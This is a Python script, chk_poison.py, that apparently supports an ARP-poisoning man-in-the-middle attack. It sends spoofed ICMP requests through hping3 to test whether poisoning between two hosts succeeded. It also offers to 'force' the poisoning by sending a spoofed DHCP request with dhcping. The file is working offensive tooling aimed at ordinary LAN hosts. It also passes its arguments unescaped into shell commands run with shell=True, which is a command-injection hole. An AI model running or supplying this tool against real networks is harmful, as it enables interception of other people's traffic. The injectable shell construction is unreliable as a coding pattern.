#!/usr/bin/env python3
# -*- coding: utf8 -*-
import sys
import subprocess
import os

###################################################
# chk_poison.py is spoofing ICMP requests to try to 
# catch ICMP replies in order to test arp poisoning
# 
# chk_poison.py <ip1> <ip2>
# 
###################################################


###################################################
# main procedure
###################################################
def main(argv):

    # check that we have at least one ip to test
    if(len(argv) != 3):
        print('Incorrect number of arguments:')
        print(argv[0] + ' <target_ip_1> <target_ip_2>')
        sys.exit(0)
    
    # for each ip passed as argument we are testing is arp poisoning is successful
    target_ip_1 = argv[1]
    target_ip_2 = argv[2]
    
    check_poisoning(target_ip_1,target_ip_2)


###################################################
# entry point for poisoning check
###################################################
def check_poisoning(target_ip_1,target_ip_2):

    # if ip has been correctly spoofed
    spoofed = {}
    spoofed[target_ip_1]=icmp_request(target_ip_2, target_ip_1)
    spoofed[target_ip_2]=icmp_request(target_ip_1, target_ip_2)

    # testing spoofed ips
    if(spoofed[target_ip_1] and spoofed[target_ip_2]):
        print('Poisoning successful!!!')
    elif(not(spoofed[target_ip_1] or spoofed[target_ip_2])):
        print('No poisoning at all!!!')
    else:
        # trying to force poisoning
        print('Do you want to force poisoning? [Yn]:',end='')
        is_fp=input()

        if is_fp.lower() == 'y' or is_fp.lower() == '':
            force_poisoning(spoofed)


###################################################
# launching icmp echo request to test arp poisoning
###################################################
def icmp_request(ip_dest, ip_spoofed):

    # using hping3 tool to send spoofed icmp requests
    try:
        command='hping3 -c 3 -n -q -1 -a ' + ip_spoofed + ' ' + ip_dest

        p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        #(output, err) = p.communicate()
        p_status = p.wait()
        
        if p_status != 0:
            print('No poisoning between ' + ip_dest + ' -> ' + ip_spoofed)
            return False

        return True
    except:
        print('Unexpected error: ', sys.exc_info()[0]) 
        sys.exit('Exception raised with command: ' + command)


###################################################
# try several techniques to force poisoning
###################################################
def force_poisoning(spoofed):

    ips=list(spoofed.keys())

    #
    # DHCP REQUEST method
    #
    try:
        command="route -n | sed -n '3{p;q;}' | awk '{print $2}'"

        # communicate() wait for process to terminate
        gateway = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True).communicate()[0].decode().strip('\n') 

        # test if gateway is part of ips
        if gateway in ips:
            
            target = ips[1] if ips[0] == gateway else ips[0]

            # and if gateway is not poisoned 
            if not spoofed[target]:

                print('Trying DHCP REQUEST to poison ' + gateway + '...')
                
                # get target mac address
                command="arping -C 1 " + target + " | grep from | awk '{print $4}'"
                target_mac = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True).communicate()[0].decode().strip('\n')   

                # send spoofed dhcp request
                command="dhcping -c " + target + " -h " + target_mac + " -s " + gateway + " -r -v"
                p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                p.wait()

                # we check back poisoning
                check_poisoning(ips[0],ips[1])

    except:
        print('Unexpected error: ', sys.exc_info()) 
        sys.exit('Exception raised with command: ' + command)


###################################################
# only for command line
###################################################
if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("You need to have root privileges to run this script.")

    main(sys.argv)
